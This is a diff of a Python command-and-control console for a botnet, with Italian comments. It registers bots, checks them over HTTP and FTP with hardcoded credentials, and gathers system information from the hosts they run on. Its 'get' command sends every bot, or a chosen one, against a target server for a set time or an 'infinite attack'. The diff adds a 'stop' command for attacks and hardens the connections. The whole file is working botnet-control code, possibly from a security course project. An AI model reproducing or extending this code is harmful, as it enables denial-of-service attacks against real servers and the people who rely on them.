@@ -3,7 +3,7 @@ import socket
 import json
 from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
-from ftplib import FTP
+from ftplib import FTP_TLS
 from time import sleep
 
 import requests
@@ -64,34 +64,37 @@ class CC:
         for k, v in self.activeBot.items():
             try:
                 url = "http://" + k + ":" + str(v['http']) + "/status"
-                response = requests.get(url)
+                response = requests.get(url, timeout=10)
                 res = response.json()
             except Exception as e:
                 print(k, " is not reachable over http port: ", e)
+
             try:
                 url = k,":",str(v['ftp'])
-                ftp = FTP(url, "CC", "Sicurezza")
-                print(ftp.getwelcome())
+                ftp = FTP_TLS()
+                ftp.connect(k,v['ftp'], timeout=10)
+                ftp.login("CC","Sicurezza")
+                ftp.close()
             except Exception as e:
                 print(k, " is not reachable over ftp port: ", e)
 
         print("Controllo terminato")
 
-    def makeHTTPRequest(self, server, time=1, target=""):
+    def makeHTTPRequest(self, server, path, time=1, target=""):
         print("Invio richiesta...")
         if target == "":
             for k, v in self.activeBot.items():
                 try:
-                    url = "http://" + k + ":" + str(v["http"]) + "/doGet"
-                    response = requests.post(url, json={"url": server, "time":time})
+                    url = "http://" + k + ":" + str(v["http"]) + path
+                    response = requests.post(url, json={"url": server, "time":time}, timeout=10)
                     res = response.json()
                     self.activeBot[k]["target"] = res["target"]
                     self.activeBot[k]["action"] = res["action"]
                 except Exception as e:
-                    print(e)
+                    print("Impossibile inviare la richiesta a ",k)
         else:
             try:
-                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
+                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + path
                 response = requests.post(url, json={"url": server, "time": time})
                 res = response.json()
                 self.activeBot[target]["target"] = res["target"]
@@ -129,7 +132,6 @@ class CC:
             except Exception as e:
                 print(e)
 
-
     def command(self, event):
         sleep(1)
         while (True):
@@ -154,23 +156,34 @@ class CC:
                 if len(c) == 1 or len(c) == 2:
                     print("Command not found")
                 if c[3] == "all":
-                    self.makeHTTPRequest(c[1], time=c[2])
+                    self.makeHTTPRequest(c[1], "/doGet", time=c[2])
                 elif c[3] in self.activeBot:
-                    self.makeHTTPRequest(c[1], time=c[2], target=c[3])
+                    self.makeHTTPRequest(c[1], "/doGet", time=c[2], target=c[3])
                 else:
-                    print("Command not found. Correct command [get server time all | get server time target(ip)]")
+                    print("Command not found. Correct command [get [server] [time(int)(-1 for infinite attack)] [all | target(ip)]]")
+            #Comando per fermare tutti gli attacchi
+            elif comando.startswith("stop"):
+                c = comando.split(" ")
+                if len(c) == 1 or len(c) == 2:
+                    print("Command not found")
+                if c[3] == "all":
+                    self.makeHTTPRequest(c[1], "/stopAttack", time=c[2])
+                elif c[3] in self.activeBot:
+                    self.makeHTTPRequest(c[1], "/stopAttack", time=c[2], target=c[3])
+                else:
+                    print("Command not found. Correct command [stop [all | target(ip)]]")
             #Comando per acquisire informazioni sul sistema che ospita il bot
             elif comando.startswith("info"):
                 c = comando.split(" ")
                 if len(c) == 1 :
-                    print("Command not found. Correct command [info ip | info all]")
+                    print("Command not found. Correct command [info [all | target(ip)]]")
                 elif c[1] == "all":
                     self.getSystemInfo()
                 else:
                     if c[1] in self.activeBot:
                         self.getSystemInfo(target=c[1])
                     else:
-                        print("Command not found. Correct command [info ip | info all]")
+                        print("Command not found. Correct command [info [all | target(ip)]]")
             #Comando per verificare la raggiungibilità dei bot
             elif comando.startswith("ck"):
                 c = comando.split(" ")
@@ -181,7 +194,7 @@ class CC:
                 elif c[1] in self.activeBot:
                     self.checkBot(target=c[1])
                 else:
-                    print("Command not found. Correct command [ck all | ck target(ip)]")
+                    print("Command not found. Correct command [ck [all | target(ip)]]")
             else:
                 print("Command not found")
                 continue
